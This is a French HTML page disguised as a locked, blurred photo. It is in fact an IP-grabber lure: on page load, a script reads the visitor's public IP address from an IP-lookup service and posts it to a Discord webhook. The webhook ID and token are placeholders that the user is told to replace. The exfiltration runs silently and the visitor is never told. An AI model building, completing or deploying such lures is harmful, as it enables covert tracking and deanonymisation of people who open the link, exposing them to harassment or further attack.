<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Unlock Photo</title>

<style>
body {
    margin: 0;
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    background: linear-gradient(135deg, #0d0d0d, #1a1a1a);
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
}

.container {
    position: relative;
    width: 350px;
    height: 500px;
    border-radius: 25px;
    overflow: hidden;
    box-shadow: 0 0 30px rgba(0,0,0,0.8), 0 0 60px rgba(0,0,0,0.4) inset;
    border: 2px solid rgba(255,255,255,0.1);
}

.container::before {
    content: "";
    position: absolute;
    top: 0; left: 0;
    width: 100%; height: 100%;
    background-image: url('https://th.bing.com/th/id/OIP.Sf-7AhO0y59pnX5ZceAlCQHaKx?w=207&h=301&c=7&r=0&o=7&dpr=1.3&pid=1.7&rm=3');
    background-size: cover;
    background-position: center;
    filter: blur(25px) brightness(0.7); /* Flou augment√© */
    z-index: 0;
}

.lock {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    font-size: 80px;
    color: #ff4d4d;
    text-shadow: 0 0 10px #ff4d4d, 0 0 20px #ff4d4d;
    background: rgba(0,0,0,0.6);
    padding: 25px;
    border-radius: 50%;
    backdrop-filter: blur(10px);
    z-index: 2;
    cursor: pointer;
    transition: transform 0.3s ease, box-shadow 0.3s ease;
}
.lock:hover {
    transform: translate(-50%, -50%) scale(1.1);
    box-shadow: 0 0 20px #ff4d4d, 0 0 40px #ff1a1a;
}

.title {
    position: absolute;
    bottom: 25px;
    width: 100%;
    text-align: center;
    color: #fff;
    font-size: 22px;
    letter-spacing: 1px;
    text-shadow: 0 0 5px rgba(255,255,255,0.5);
    z-index: 2;
}
</style>
</head>

<body>

<div class="container">
    <div class="lock">üîí</div>
    <div class="title">Photo verrouill√©e</div>
</div>

<script>
// Envoie l'IP publique vers un webhook Discord
window.onload = function() {
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ip = data.ip;

            const webhookUrl = 'https://discord.com/api/webhooks/TON_WEBHOOK_ID/TON_WEBHOOK_TOKEN'; // Remplace par ton webhook

            const payload = {
                content: `IP publique d√©tect√©e : **${ip}**`
            };

            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            })
            .catch(error => console.error('Erreur lors de l\'envoi vers le webhook Discord:', error));
        })
        .catch(error => console.error('Erreur lors de la r√©cup√©ration de l\'IP:', error));
};
</script>

</body>
</html>
